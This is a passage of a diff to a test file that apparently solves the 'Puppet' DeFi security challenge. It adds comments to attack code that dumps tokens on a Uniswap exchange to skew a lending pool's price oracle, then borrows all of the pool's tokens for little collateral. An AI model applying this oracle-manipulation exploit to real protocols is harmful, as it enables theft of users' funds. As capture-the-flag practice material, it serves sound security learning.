@@ -107,7 +107,7 @@ describe('[Challenge] Puppet', function () {
         const attackUni = await this.uniswapExchange.connect(attacker);
         const attackToken = await this.token.connect(attacker);
 
-
+        //allow uni to spend token
         await attackToken
             .approve
             (
@@ -116,7 +116,7 @@ describe('[Challenge] Puppet', function () {
             )
 
         const now = Math.floor(new Date().getTime() / 1000 );
-        
+        //swap token for eth 
         await attackUni
             .tokenToEthSwapInput
             (
@@ -125,15 +125,19 @@ describe('[Challenge] Puppet', function () {
                 (await ethers.provider.getBlock('latest')).timestamp * 2 ,
                 {gasLimit : 1e6}
             );
-
-        console.log(`price = ${await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}`);
+        
+        // get the amount of ether you need to send to take all DVT token
+        const ethTransffered = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(`Eth required for collatereal = ${ethTransffered}`);
+        
+        //now transfer that ETH and get all DVT tokens
         await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, 
-            {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)});
+            {value: ethTransffered});
 
+        // find out how much eth to give to uniswap for taking ATTACKER_INITIAL_TOKEN_BALANCE amt of DVT token
         const ethRequired = await this.uniswapExchange
             .connect(attacker)
             .getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, {gasLimit : 1e6});
-
         await this.uniswapExchange
             .connect(attacker)
             .ethToTokenSwapOutput(
